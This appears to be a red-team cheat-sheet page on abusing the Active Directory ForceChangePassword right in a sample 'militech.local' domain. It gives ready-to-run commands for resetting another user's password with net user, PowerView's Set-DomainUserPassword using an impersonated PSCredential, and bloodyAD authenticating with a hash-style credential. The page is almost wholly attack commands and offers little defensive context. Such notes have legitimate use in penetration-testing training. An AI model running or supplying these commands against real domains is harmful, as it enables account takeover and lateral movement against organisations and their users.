# ForceChangePassword

## <mark style="color:yellow;">Change the user's password with net</mark>

<mark style="color:orange;">**Full Privileges Required!**</mark>

```powershell
net user songbird S4MUR41 /domain
```

## <mark style="color:yellow;">Creating PSCredentials object</mark>

If we do not run PowerShell as other user, we may put their creds to secure PS object so we can impersonate him.&#x20;

1. With first command we are converting a plaintext password to SecureString (which protecting creds from memory reading).
2. With second command we are putting that SecureString into PSCredentials object for further use.

```powershell
PS C:\> $SecPassword = ConvertTo-SecureString 'h4ck4allth3th1ngs' -AsPlainText -Force
PS C:\> $Cred = New-Object System.Management.Automation.PSCredential('MILITECH\sreed', $SecPassword)
```

## <mark style="color:yellow;">Changing the user's password with PowerView</mark>

Here are are making a SecureString for new **songbird's** password and changing it using **sreed's** credentials in <mark style="color:green;">`-Credential $Cred`</mark>. <mark style="color:orange;">**PowerView Required!**</mark>

```powershell
PS C:\> $songbirdPassword = ConvertTo-SecureString 'S4MUR41' -AsPlainText -Force
PS C:> Set-DomainUserPassword -Identity songbird -AccountPassword $songbirdPassword -Credential $Cred -Verbose
```

## <mark style="color:yellow;">BloodyAD</mark>

If you have right to change someone's password, you can use **BloodyAD** Tool [**\[LINK\]**](https://github.com/CravateRouge/bloodyAD)

```bash
bloodyAD --host 13.13.13.13 -d militech.local -u 's.reed' -p :4bfkohjaosdoi234hjhaf set password 'songbird' 'P@ssword123'
```

> Here we changing songbird's password by using s.reed credentials.
